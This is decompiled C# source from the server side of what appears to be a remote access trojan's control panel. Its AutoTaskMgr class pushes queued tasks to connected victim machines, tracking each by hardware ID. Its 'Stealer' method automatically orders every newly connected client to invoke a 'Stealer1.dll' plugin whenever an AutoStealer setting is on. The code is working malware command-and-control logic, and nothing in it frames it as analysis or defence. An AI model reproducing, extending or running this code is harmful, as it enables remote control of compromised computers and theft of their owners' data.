using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;
using Newtonsoft.Json;
using Server.Connectings;
using Server.Data;

namespace Server.Helper.Tasks
{
	// Token: 0x0200007F RID: 127
	internal class AutoTaskMgr
	{
		// Token: 0x060002CA RID: 714 RVA: 0x00024DAC File Offset: 0x00022FAC
		public static void RunTasks(Clients clients)
		{
			if (!File.Exists("local\\Tasks.json"))
			{
				return;
			}
			object sync = AutoTaskMgr.SYNC;
			lock (sync)
			{
				foreach (object obj in ((IEnumerable)Program.form.dataGridView2.Rows))
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					Task item = (Task)dataGridViewRow.Tag;
					if (item.RunOnce)
					{
						bool flag2 = false;
						using (List<string>.Enumerator enumerator2 = item.TasksRunsed.GetEnumerator())
						{
							while (enumerator2.MoveNext())
							{
								if (enumerator2.Current == clients.Hwid)
								{
									flag2 = true;
									break;
								}
							}
						}
						if (flag2)
						{
							continue;
						}
						System.Threading.Tasks.Task.Run(delegate()
						{
							clients.Send(item.task);
						});
						item.TasksRunsed.Add(clients.Hwid);
					}
					else
					{
						System.Threading.Tasks.Task.Run(delegate()
						{
							clients.Send(item.task);
						});
					}
					item.Runs += 1L;
					dataGridViewRow.Cells[1].Value = item.Runs;
				}
			}
		}

		// Token: 0x060002CB RID: 715 RVA: 0x00024F94 File Offset: 0x00023194
		public static void Import()
		{
			foreach (Task task in JsonConvert.DeserializeObject<List<Task>>(File.ReadAllText("local\\Tasks.json")))
			{
				DataGridViewRow dataGridViewRow = new DataGridViewRow();
				dataGridViewRow.Tag = task;
				dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = task.RunOnce
				});
				dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = task.Runs
				});
				dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = task.Name
				});
				Program.form.dataGridView2.Invoke(new MethodInvoker(delegate()
				{
					Program.form.dataGridView2.Rows.Add(dataGridViewRow);
				}));
			}
		}

		// Token: 0x060002CC RID: 716 RVA: 0x00025098 File Offset: 0x00023298
		public static void Export()
		{
			List<Task> list = new List<Task>();
			foreach (object obj in ((IEnumerable)Program.form.dataGridView2.Rows))
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				list.Add(dataGridViewRow.Tag as Task);
			}
			File.WriteAllText("local\\Tasks.json", JsonConvert.SerializeObject(list));
		}

		// Token: 0x060002CD RID: 717 RVA: 0x0002511C File Offset: 0x0002331C
		public static void AppendTask(Task item)
		{
			DataGridViewRow dataGridViewRow = new DataGridViewRow();
			dataGridViewRow.Tag = item;
			dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
			{
				Value = item.RunOnce
			});
			dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
			{
				Value = item.Runs
			});
			dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
			{
				Value = item.Name
			});
			Program.form.dataGridView2.Invoke(new MethodInvoker(delegate()
			{
				Program.form.dataGridView2.Rows.Add(dataGridViewRow);
			}));
			Clients[] array = Program.form.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					AutoTaskMgr.RunTasks(clients);
				});
			}
		}

		// Token: 0x060002CE RID: 718 RVA: 0x0002520C File Offset: 0x0002340C
		public static void Stealer(Clients clients)
		{
			if (File.Exists("local\\Settings.json") && JsonConvert.DeserializeObject<Settings>(File.ReadAllText("local\\Settings.json")).AutoStealer)
			{
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						Methods.GetChecksum("Plugin\\Stealer1.dll"),
						new byte[1]
					});
				});
			}
		}

		// Token: 0x04000186 RID: 390
		public static object SYNC = new object();
	}
}
